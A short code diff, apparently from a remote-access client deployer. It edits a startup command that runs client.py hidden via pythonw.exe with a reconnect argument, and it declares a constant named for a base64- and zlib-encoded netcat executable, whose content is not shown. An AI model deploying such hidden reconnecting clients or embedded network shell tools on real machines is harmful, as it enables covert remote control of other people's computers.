@@ -19,7 +19,7 @@ sys.path.append(os.path.split(__file__)[0])
 
 CLIENT_STARTUP_SCRIPT: Final[
     str
-] = "cd {{ TARGET_DIR }};{{ TARGET_DIR }}/Scripts/activate.ps1;{{ TARGET_DIR }}/Scripts/pythonw.exe {{ TARGET_DIR }}/client.py"
+] = "cd {{ TARGET_DIR }};{{ TARGET_DIR }}/Scripts/activate.ps1;{{ TARGET_DIR }}/Scripts/pythonw.exe {{ TARGET_DIR }}/client.py --reconnect {{ NAME }}"
 
 NETCAT_B64_ZLIB_EXE: Final[
     str
